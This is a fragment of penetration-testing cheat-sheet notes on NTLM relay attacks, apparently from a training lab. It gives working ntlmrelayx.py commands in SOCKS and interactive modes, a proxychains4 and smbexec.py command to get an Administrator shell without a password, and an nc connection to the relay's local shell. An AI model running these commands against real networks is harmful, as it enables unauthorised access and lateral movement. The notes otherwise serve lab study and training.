...
---
## SOCKS MODE TO GET A SHELL

```bash
ntlmrelayx.py -t 10.10.111.11 -smb2support -socks

proxychains4 -q smbexec.py 'LOL/Administrator@10.10.111.11' -no-pass
```

also interactive shell by `-i` instead of socks then `nc -nv 127.0.0.1 11000`
...
| Single Named Target   | `-t smb://INLANEFREIGHT\<USERNAME>` | Enabled                       |
...
```bash
ntlmrelayx.py -t smb://INLANEFREIGHT\\<USERNAME>
```
